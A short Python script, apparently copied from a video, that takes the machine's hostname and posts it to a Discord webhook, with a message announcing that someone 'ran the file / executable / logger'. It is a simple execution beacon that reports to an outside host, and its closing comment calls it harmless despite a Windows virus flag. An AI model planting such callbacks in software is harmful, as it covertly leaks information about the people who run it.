import requests
import socket
hostname = socket.gethostname()
def send_message_to_webhook(webhook_url, message):
    data = {

        'content': message
    }

    headers = {
            "Content-Type": "application/json"
    }
    response = requests.post(webhook_url, json=data, headers=headers)

    if response.status_code ==200:
        print(f'ok')

if __name__ == "__main__":
    webhook_url = 'PUT_DISCORD_WEBHOOK_URL'
message_to_send = f'{hostname} ran the file / executable / logger.'
send_message_to_webhook(webhook_url, message_to_send)
# i did this by copying from a video
# this is not dangerous but Windows flagged it as a virus